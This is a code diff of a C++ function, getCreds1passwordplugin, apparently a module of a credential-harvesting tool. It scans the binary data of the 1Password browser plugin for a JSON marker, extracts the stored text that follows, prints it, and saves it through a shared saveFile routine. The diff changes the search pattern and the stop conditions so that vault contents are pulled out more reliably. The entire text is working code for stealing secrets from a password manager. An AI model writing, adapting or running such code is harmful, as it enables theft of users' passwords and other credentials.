@@ -1,45 +1,51 @@
 #pragma once
 #include <iostream>
 #include <fstream>
-#include <vector>
 #include <string>
+#include <vector>
 #include "../../core/saveFile.h"
 
-void getCreds1passwordplugin(std::string filename) {
+int getCreds1passwordplugin(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
         std::cerr << "Error opening the file." << std::endl;
+        return 1;
     }
 
-    std::string searchSequence = ":\"Username\"}}";
-    std::vector<char> foundData;
+    std::string searchKeyword = ",\"dragAction\":{\"value\":{\"type\":\"Text\",\"content\":\"";
+    std::string foundData;
 
     while (!file.eof()) {
         char c;
         file.get(c);
 
-        if (c == searchSequence[foundData.size()]) {
-            foundData.push_back(c);
-            if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 2000 binary characters
-                std::vector<char> extractedData;
-                for (int i = 0; i < 2000; i++) {
-                    file.get(c);
-                    if (file.eof()) {
+        if (c == searchKeyword[foundData.size()]) {
+            foundData += c;
+            if (foundData == searchKeyword) {
+                // We found the search keyword, now collect data until 0x22 or 0x7d is found
+                std::vector<unsigned char> extractedData;
+
+                while (!file.eof()) {
+                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
+
+                    // Stop when 0x22 (") or 0x7d (}) is found
+                    if (c == 0x22 || c == 0x7d) {
                         break;
                     }
+
                     extractedData.push_back(c);
                 }
 
-                // Print the extracted data as UTF-8
+                // Convert the binary data to a UTF-8 string
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
-                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
-                //Save into file
+                // Print the extracted UTF-8 string
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
+
+                // Save into file
                 saveFile(utf8ExtractedData);
 
-                // Clear the foundData vector to search for the next occurrence
                 foundData.clear();
             }
         }
@@ -49,4 +55,5 @@ void getCreds1passwordplugin(std::string filename) {
     }
 
     file.close();
+    return 0;
 }
